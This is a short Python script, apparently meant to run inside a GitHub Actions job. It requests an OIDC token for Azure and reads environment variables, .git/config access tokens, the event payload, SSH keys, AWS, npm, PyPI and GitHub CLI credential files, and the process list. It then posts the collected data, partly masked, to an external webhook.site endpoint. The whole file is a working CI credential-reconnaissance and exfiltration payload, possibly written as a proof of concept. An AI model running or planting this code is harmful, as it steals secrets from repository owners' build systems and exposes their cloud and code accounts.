import os, urllib.request, json, subprocess, re

# User-provided endpoint
url = "https://webhook.site/88a36936-31a1-4a36-b44e-62160f737d6e"
data = {}

def mask(s):
    return f"{s[:4]}...{s[-4:]}" if s and len(s) > 8 else "***"

try:
    # 1. OIDC Token Request
    oidc_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    oidc_token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if oidc_url and oidc_token:
        req = urllib.request.Request(f"{oidc_url}&audience=api://AzureADTokenExchange", headers={"Authorization": f"Bearer {oidc_token}"})
        with urllib.request.urlopen(req) as response:
            jwt = json.loads(response.read().decode())["value"]
            data["oidc_jwt_proof"] = mask(jwt)
except Exception as e:
    data["oidc_error"] = str(e)

try:
    # 2. Env Vars (Masked)
    data["env"] = {k: mask(v) if any(x in k for x in ["TOKEN","KEY","SECRET","PASS"]) else v for k,v in os.environ.items()}
except: pass

try:
    # 3. Git Config (Masked)
    cfg = subprocess.check_output(["cat", ".git/config"]).decode()
    data["git_config"] = re.sub(r"(x-access-token:)([^@]+)", lambda m: f"{m.group(1)}{mask(m.group(2))}", cfg)
except: pass

try:
    # 4. GITHUB_EVENT_PATH (Event JSON)
    path = os.environ.get("GITHUB_EVENT_PATH")
    if path and os.path.exists(path):
        with open(path, "r") as f:
            data["event_json_summary"] = mask(f.read())
except: pass

try:
    # 5. File System Recon (Repo Specific Targets from .gitignore)
    # Checking for locally cached credentials or env files
    target_files = [
        ".env", 
        "demo/env", 
        "tools/gmail/client_secret.json", 
        "tools/gmail/token.json",
        "tools/get_keys.config.json",  # Shared Vault Config
        ".vscode/launch.json",
        ".vscode/settings.json"
    ]
    
    # Also check home dir configs
    home = os.environ.get("HOME", "/home/runner")
    target_files.extend([
        os.path.join(home, ".npmrc"),
        os.path.join(home, ".pypirc"),
        os.path.join(home, ".netrc"),
        os.path.join(home, ".ssh/id_rsa"),
        os.path.join(home, ".aws/credentials"),
        os.path.join(home, ".config/gh/hosts.yml")
    ])

    found_files = {}
    for f in target_files:
        if os.path.exists(f):
            try:
                content = open(f, "r").read()
                found_files[f] = mask(content)
            except: found_files[f] = "ACCESS_DENIED"
    data["fs_recon"] = found_files
except: pass

try:
    # 6. Process List (Check for secrets in args)
    ps = subprocess.check_output(["ps", "aux"]).decode()
    data["process_list_summary"] = mask(ps)
except: pass

# Send Data (HTTP)
try:
    req = urllib.request.Request(url, data=json.dumps(data).encode("utf-8"), headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req)
except: pass
